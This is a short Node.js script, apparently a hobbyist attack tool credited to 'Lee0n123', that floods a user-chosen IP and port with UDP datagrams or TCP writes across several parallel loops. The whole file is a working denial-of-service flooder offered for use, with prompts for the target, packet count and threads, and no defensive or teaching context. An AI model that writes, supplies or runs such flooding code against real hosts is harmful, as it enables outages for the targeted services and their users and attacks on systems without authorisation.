const dgram = require('dgram');
const net = require('net');
const readline = require('readline');

const rl = readline.createInterface({
  input: process.stdin,
  output: process.stdout
});

const getArgs = () => {
  return new Promise((resolve) => {
    let args = {};
    rl.question("Host IP: ", (ip) => {
      args.ip = ip;
      rl.question("Port: ", (port) => {
        args.port = parseInt(port);
        rl.question("UDP(y/n): ", (choice) => {
          args.choice = choice.toLowerCase() === 'y';
          rl.question("Packets per connection (default 50000): ", (times) => {
            args.times = times ? parseInt(times) : 50000;
            rl.question("Threads (default 5): ", (threads) => {
              args.threads = threads ? parseInt(threads) : 5;
              resolve(args);
              rl.close();
            });
          });
        });
      });
    });
  });
};

const runUDP = (ip, port, times) => {
  const data = Buffer.alloc(1024, 'X');
  const client = dgram.createSocket('udp4');

  return () => {
    let i = Math.random() > 0.5 ? "[*]" : "[#]";
    setInterval(() => {
      for (let x = 0; x < times; x++) {
        client.send(data, 0, data.length, port, ip, (err) => {
          if (err) {
            console.error("[!] Error!!!");
            client.close();
          }
        });
      }
      console.log(i + " Sent!!!");
    }, 0);
  };
};

const runTCP = (ip, port, times) => {
  const data = Buffer.alloc(16, 'X');

  return () => {
    let i = Math.random() > 0.5 ? "[*]" : "[#]";
    const client = new net.Socket();

    client.connect(port, ip, () => {
      setInterval(() => {
        for (let x = 0; x < times; x++) {
          client.write(data);
        }
        console.log(i + " Sent!!!");
      }, 0);
    });

    client.on('error', () => {
      console.error("[*] Error");
      client.destroy();
    });
  };
};

const main = async () => {
  console.log("--> C0de By Lee0n123 <--");
  console.log("#-- TCP/UDP FLOOD --#");

  const args = await getArgs();

  const { ip, port, choice, times, threads } = args;

  for (let y = 0; y < threads; y++) {
    if (choice) {
      const udpFlooder = runUDP(ip, port, times);
      udpFlooder();
    } else {
      const tcpFlooder = runTCP(ip, port, times);
      tcpFlooder();
    }
  }
};

main();
